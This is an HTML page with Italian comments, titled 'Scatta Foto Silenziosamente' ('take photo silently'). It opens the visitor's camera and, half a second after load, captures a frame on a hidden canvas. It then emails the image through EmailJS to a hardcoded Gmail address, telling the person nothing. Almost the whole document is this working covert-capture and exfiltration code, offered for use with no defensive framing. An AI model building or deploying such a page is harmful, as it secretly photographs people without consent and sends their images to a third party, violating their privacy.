<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scatta Foto</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>
    <h1>Scatta Foto Silenziosamente</h1>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        emailjs.init('user_XYZ12345');  // Sostituisci con il tuo User ID EmailJS!

        // Inizializza la fotocamera
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.getElementById('video');
            video.srcObject = stream;
        })
        .catch(function(err) {
            console.log('Errore nell\'accesso alla fotocamera: ' + err);
        });

        // Funzione per scattare la foto dopo 0.5 secondi
        function scattaFoto() {
            var canvas = document.getElementById('canvas');
            var video = document.getElementById('video');
            var context = canvas.getContext('2d');

            // Disegna il video nel canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Converte l'immagine in base64
            var imgData = canvas.toDataURL('image/png');

            // Invia l'immagine tramite EmailJS
            var templateParams = {
                to_email: 'sharafomar834@gmail.com',  // Sostituito con il tuo indirizzo email
                from_name: 'Fotocamera',
                message: 'Foto scattata automaticamente',
                attachment: imgData
            };

            emailjs.send('service_mrkzn2a', 'template_id', templateParams)  // Sostituisci 'template_id' con il tuo template ID
            .then(function(response) {
                console.log('Foto inviata con successo:', response);
            }, function(error) {
                console.log('Errore nell\'invio della foto:', error);
            });
        }

        // Scatta la foto automaticamente dopo 0.5 secondi
        setTimeout(scattaFoto, 500);  // 500ms = 0.5 secondi
    </script>
</body>
</html>
